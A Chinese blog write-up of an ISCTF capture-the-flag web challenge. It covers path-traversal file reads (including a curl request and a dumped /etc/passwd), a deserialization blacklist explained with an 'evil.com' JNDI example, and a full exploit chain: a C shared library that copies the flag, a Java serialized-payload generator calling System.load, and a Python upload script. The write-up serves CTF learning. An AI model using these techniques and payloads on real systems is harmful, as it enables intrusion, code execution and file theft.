---
title: "ISCTF-load-jvav"
image: ''
pinned: false
comment: true
published: 2025-12-08
description: "CTF 学习笔记与技术复盘"
category: 学习
tags: [学习]
---

没有吃过什么叫毫无头绪的可以过来打一下。\

这一题是我觉得既然那题java反序列做了，那也来看看这个。

# #load_jvav

![alt text](/images/QQ20251211-193325.png)

![alt text](/images/QQ20251210-205652.png)

看着十分人畜无害，到时候，你就会狠狠老实了。

题目写着java，所以大概率是java的后端，题目是没有给源码的，所以我们暂时无法确定这题的样子，我直接狠狠扫了一下。

有一个admin。

![alt text](/images/QQ20251210-210004.png)

访问一下，就有了一个，"data": "居然你懂得访问admin目录，那么就告诉你个秘密:file:/app/ezJava.jar!/BOOT-INF/classes!/"，一个小提醒。

看到这个，其实我们就大致知道源码的位置了，我虽然不知道，要怎么做，我直接爆破了。

各种爆破，直接拿下了源码，

> curl "http://challenge.bluesharkinfo.com:24416/api/FileRead?filename=../../../app/ezjava_src.zip"

还有，我们还得到了许多信息。

![alt text](/images/QQ20251210-210723.png)

解码得到：

```
JAVA_HOME=/usr/local/openjdk-11
JAVA_VERSION=11.0.13
```

这是后台java的版本。

![alt text](/images/QQ20251210-211155.png)

Docker容器环境内启动的靶机，然后进程在跟cgroup里面。

![alt text](/images/QQ20251210-211449.png)

```
java -jar /app/ezJava.jar
```

目前的进程。

![alt text](/images/QQ20251210-211604.png)

解码内容：

```
#!/bin/bash
set -e

if [ -n "$DASFLAG" ]; then
    INSERT_FLAG="$DASFLAG"
    export DASFLAG=no_FLAG
    DASFLAG=no_FLAG
elif [ -n "$FLAG" ]; then
    INSERT_FLAG="$FLAG"
    export FLAG=no_FLAG
    FLAG=no_FLAG
elif [ -n "$GZCTF_FLAG" ]; then
    INSERT_FLAG="$GZCTF_FLAG"
    export GZCTF_FLAG=no_FLAG
    GZCTF_FLAG=no_FLAG
else
    INSERT_FLAG="flag{TEST_Dynamic_FLAG}"
fi

mkdir -p /flag
echo "$INSERT_FLAG" > /flag/flag.flag
chmod 744 /flag/flag.flag

exec java \
  -Dspring.autoconfigure.exclude=org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration \
  -jar /app/ezJava.jar
```

应用启动时从环境变量读取flag，flag被写入文件：`/flag/flag.flag`，写入后立即设置为 `no_FLAG`，环境变量被清除。

![alt text](/images/QQ20251210-212025.png)

根目录读取，看见个flag。

![alt text](/images/QQ20251210-212115.png)

app内文件读取，看见源代码了。

![alt text](/images/QQ20251210-212153.png)

尝试直接读取flag，什么都没有。

![alt text](/images/QQ20251210-212313.png)

解码得到：

```
root: x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin: x:2:2:bin:/bin:/usr/sbin/nologin
sys: x:3:3:sys:/dev:/usr/sbin/nologin
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/usr/sbin/nologin
man: x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp: x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail: x:8:8:mail:/var/mail:/usr/sbin/nologin
news: x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp: x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy: x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup: x:34:34:backup:/var/backups:/usr/sbin/nologin
list: x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc: x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody: x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt: x:100:65534::/nonexistent:/usr/sbin/nologin
```

历遍目录可以用。

![alt text](/images/QQ20251211-184420.png)

直接读取flag位置，失败。

![alt text](/images/QQ20251211-184530.png)

直接读取文件，发现成功了。

---

这边其实拿到源码后，就能做了，只是比赛当时看不懂java里面的漏洞，所以没做出来，事不宜迟，直接上漏洞。

![alt text](/images/QQ20251211-184801.png)

这边其实最主要的是这一段，研究一下，其实可以发现，如果当上传文件的后缀包含 `.ref` 时，后端会对文件内容进行 Base64 解码并反序列化。

又是反序列化，又要找链。

![alt text](/images/QQ20251211-184943.png)

还怪好的，youfindthis。

![alt text](/images/QQ20251211-185217.png)

看这边，`readObject`使用了一个自定义的POFP方法。

![alt text](/images/QQ20251211-185510.png)

紧接着这边`method.invoke(input, args)` 允许程序执行任何对象 (`input`) 的任何方法 (`method`)，并传入任何参数 (`args`)。

其实题目也是有一个黑名单的，但是如果没注意，直接用这个，也没事。

```
package com.example.utile;

import java.io.*;
import java.util.*;

public class safeSer extends ObjectInputStream {

    private static final Set<String> BLACKLIST = new HashSet<>(Arrays.asList(
            // Apache Commons Collections 相关类
            "org.apache.commons.collections.Transformer",
            "org.apache.commons.collections.functors.ChainedTransformer",
            "org.apache.commons.collections.functors.ConstantTransformer",
            "org.apache.commons.collections.functors.InvokerTransformer",
            "org.apache.commons.collections.functors.InstantiateTransformer",
            "org.apache.commons.collections.map.DefaultedMap",
            "org.apache.commons.collections.map.LazyMap",
            "org.apache.commons.collections.map.TransformedMap",

            // Commons Collections4
            "org.apache.commons.collections4.Transformer",
            "org.apache.commons.collections4.functors.ChainedTransformer",
            "org.apache.commons.collections4.functors.ConstantTransformer",
            "org.apache.commons.collections4.functors.InvokerTransformer",
            "org.apache.commons.collections4.functors.InstantiateTransformer",

            // 其他常见的危险类

            "javax.management.BadAttributeValueExpException",
            "java.rmi.server.UnicastRemoteObject",
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            "com.sun.rowset.JdbcRowSetImpl",
            //解决一些非预期问题
            "springboot",
            "springframework",
            "com.fasterxml",
            "jackson",
            "org.yaml",
            "org.thymeleaf"


    ));

    public safeSer(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();

        // 检查类是否在黑名单中
        if (isMaliciousClass(className)) {
            throw new SecurityException("检测到潜在的反序列化攻击，类: " + className);
        }

        return super.resolveClass(desc);
    }

    private boolean isMaliciousClass(String className) {
        // 直接匹配黑名单
//        if (BLACKLIST.contains(className)) {
//            return true;
//        }
        for (String blacklist : BLACKLIST) {
            if (className.contains(blacklist)) {
                return true;
            }
        }
        // 检查包名前缀（更严格的检测）
        if (className.startsWith("org.apache.commons.collections.functors.") ||
                className.startsWith("org.apache.commons.collections4.functors.") ||
                className.startsWith("org.apache.commons.collections.") &&
                        className.contains("Transformer")) {
            return true;
        }

        return false;
    }
}

```

**黑名单作用：**

1. 禁止了 Apache Commons Collections (CC 链)

这是 Java 反序列化最经典、最普遍的利用链（ysoserial 中的 CC1 - CC7 等）。

- **核心执行类：**
  - `Transformer`, `ChainedTransformer`, `ConstantTransformer`, `InvokerTransformer`, `InstantiateTransformer`。
  - **作用：** 这些类允许通过反射链式调用任意方法（通常是 `Runtime.exec`），是实现 RCE（远程代码执行）的引擎。
- **触发类/辅助类：**
  - `DefaultedMap`, `LazyMap`, `TransformedMap`。
  - **作用：** 这些 Map 类通常用于装饰器模式，当攻击者访问 Map 元素或修改 Map 时，会自动触发内部的 Transformer 链，从而执行恶意代码。

2. 禁止了高危的 JDK 原生及常用库利用点

除了 CC 链，代码还封锁了几个历史上非常著名的反序列化 Sink（执行点）和 Source（入口点）。

- **`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`**
  - **攻击方式：** 这是很多利用链（如 CC2, CC3, CC4, CommonsBeanutils1 等）的最终执行点。
  - **原理：** 它允许攻击者传入恶意的字节码，并在反序列化过程中通过 `defineClass` 动态加载该字节码，直接导致任意代码执行。
- **`com.sun.rowset.JdbcRowSetImpl`**
  - **攻击方式：** **JNDI 注入**。
  - **原理：** 攻击者可以设置 `dataSourceName` 为恶意的 RMI/LDAP 地址（如 `rmi://evil.com/exploit`）。当该对象被反序列化（或触发 `setAutoCommit`）时，服务器会去连接恶意服务器并下载执行恶意对象。
- **`javax.management.BadAttributeValueExpException`**
  - **攻击方式：** 触发点（Trigger）。
  - **原理：** 它的 `readObject` 方法会触发内部对象的 `toString()` 方法。这通常被用来连接那些靠 `toString` 触发的利用链（例如 CC5）。
- **`java.rmi.server.UnicastRemoteObject`**
  - **攻击方式：** JRMP 攻击。
  - **原理：** 用于建立恶意的 RMI 连接，可能导致服务器反向连接攻击者的 JRMP 监听端口。

3. "暴力"封禁了常见 Web 框架和库

这一部分（代码注释标注为“解决一些非预期问题”）采用了一种非常激进的策略。由于 `isMaliciousClass` 使用的是 `className.contains(blacklist)`（包含匹配），只要类名里带有以下字符串，就会被拦截。

- **`springboot`, `springframework`**
  - **目的：** 直接封杀所有 Spring 框架相关的类。防止利用 Spring 内部的 Gadget（如 `POJONode` 等）或 Spring 的 JNDI 利用点。
- **`com.fasterxml`, `jackson`**
  - **目的：** 封杀 Jackson JSON 库。虽然 Jackson 主要处理 JSON，但其某些类在原生序列化中也可能被滥用，或者配合多态反序列化进行攻击。
- **`org.yaml`**
  - **目的：** 封杀 SnakeYAML 相关类。
- **`org.thymeleaf`**
  - **目的：** 封杀 Thymeleaf 模板引擎相关类。

以上内容均为ai解析，我是没有看懂的，不过可以长长见识，有点印象。

---

由于服务器器设置，我们是无法直接访问到flag所在的文件，所以，我们的想法是将flag搬出来，放在我们可以阅读的文件上。

因为 C 语言能通过 `constructor` 实现“加载即运行”，而且 C 语言编写的文件在编译后正好是给机器阅读的二进制代码。

由此，我们初步写出：

```
#include <stdio.h>
#include <stdlib.h>

// 构造函数：库加载时自动执行
void __attribute__ ((constructor)) setup(void) {
    FILE *src_flag, *dst_file;
    char ch;

    // 1. 打开源文件 (尝试标准路径)
    src_flag = fopen("/flag/flag.flag", "r");
    if (src_flag == NULL) {
        // 如果失败，尝试根目录good.txt
        src_flag = fopen("/flag", "r");
    }

    if (src_flag == NULL) return;

    // 2. 打开目标文件 (写入到上传目录，避开 flag 关键字)
    dst_file = fopen("/app/upload/hack.txt", "w");
    if (dst_file == NULL) {
        // 如果绝对路径不对，尝试相对路径
        dst_file = fopen("./upload/hack.txt", "w");
    }

    if (dst_file == NULL) {
        fclose(src_flag);
        return;
    }

    // 3. 逐字节复制内容 (纯底层操作，不依赖 shell)
    while ((ch = fgetc(src_flag)) != EOF) {
        fputc(ch, dst_file);
    }

    fclose(src_flag);
    fclose(dst_file);
}
```

编译后，将得到的恶意.so文件上传。紧接着，我们需要触发java反序列化，然后服务器读取我们的so文件，并将flag搬出。

代码如下：

```
package com.example.utile;

import javax.naming.InitialContext;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class PayloadGen {
    public static void main(String[] args) throws Exception {
        YouFindThis gadget = new YouFindThis();
        
        // 1. 目标类: System
        gadget.aClass = java.lang.System.class;
        
        // 2. 参数类型: String
        gadget.argclass = String.class;
        
        // 3. 目标方法: load 
        gadget.methed = "load";
        
        // 4. input: 静态方法忽略此参数，但需非空
        gadget.input = "ignored"; 
        
        // 5. 参数: .so 文件的绝对路径
        gadget.args = "/app/upload/hack_final.so"; 

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(gadget);
        oos.close();

        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
```

这个java代码运行出一大串的base64编码，然后我们利用py代码，直接上传。

```
import requests

TARGET_URL = "http://challenge.bluesharkinfo.com:26971/api/upload"

PAYLOAD = "Base64字符串" 

def exploit():
    print(f"[*] 正在发送触发包 (System.load) 到: {TARGET_URL}")
    
    # 1. key 必须是 'file'
    # 2. filename 必须以 .ref 结尾 (这是 api.java 触发反序列化的条件)
    # 3. 内容 是 Java 生成的 Base64
    files = {
        'file': ('trigger.ref', PAYLOAD, 'application/octet-stream')
    }

    try:
        # 发送请求
        # timeout 设置为 10 秒，因为 System.load 可能会导致短暂阻塞
        response = requests.post(TARGET_URL, files=files, timeout=10)
        
        print(f"[*] 响应状态码: {response.status_code}")
        print(f"[*] 响应内容: {response.text}")

        if "备份成功" in response.text:
            print("\n[+] 触发成功！")
        else:
            print("\n[-] 未看到'备份成功'提示，但有可能已经执行。建议直接去尝试读取 Flag。")

    except Exception as e:
        print(f"[-] 请求发送异常 (可能是因为服务被加载挂起了，属正常现象): {e}")
        print("[*] 依然建议去尝试读取 Flag。")

if __name__ == "__main__":
    if PAYLOAD == "这里填你生成的Base64字符串":
        print("[-] 错误：请先将 Java 生成的 Base64 填入 PAYLOAD 变量！")
    else:
        exploit()
```

最后通过触发服务器java反序列化，执行我们的恶意文件，将flag搬出放在hack.txt上，直接访问hack.txt。就拿到了flag。

---

---

---

---

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
